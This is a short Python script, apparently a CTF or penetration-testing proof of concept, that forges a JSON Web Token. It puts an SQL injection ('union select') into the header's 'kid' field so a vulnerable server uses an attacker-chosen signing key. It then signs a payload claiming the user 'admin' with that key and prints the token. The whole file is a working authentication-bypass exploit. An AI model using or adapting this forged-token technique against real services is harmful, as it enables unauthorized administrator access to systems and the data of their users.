import hashlib 
import hmac
import json
from sys import version_info
import base64

header = {"typ": "JWT","alg": "HS256", "kid":"zzzzzzzzz' union select 'aaa"}
key="aaa"
payload={"user":"admin"}
if version_info[0] ==2:
        str = base64.urlsafe_b64encode(json.dumps (header)).rstrip("=")+"."+base64.urlsafe_b64encode(json.dumps (payload)).rstrip("=")
        sig = base64.urlsafe_b64encode(hmac.new(key, str, hashlib.sha256).digest()).decode('utf8').rstrip("=")
else:
        str = base64.urlsafe_b64encode(bytes(json.dumps(header), encoding='utf8')).decode('utf8').rstrip("=")+"."+base64.urlsafe_b64encode(bytes(json.dumps(payload), encoding='utf8')).decode('utf8').rstrip("=")
        sig = base64.urlsafe_b64encode(hmac.new(bytes(key, encoding='utf8'), str.encode('utf8'), hashlib.sha256).digest()).decode('utf8').rstrip("=")

print(str+"."+sig)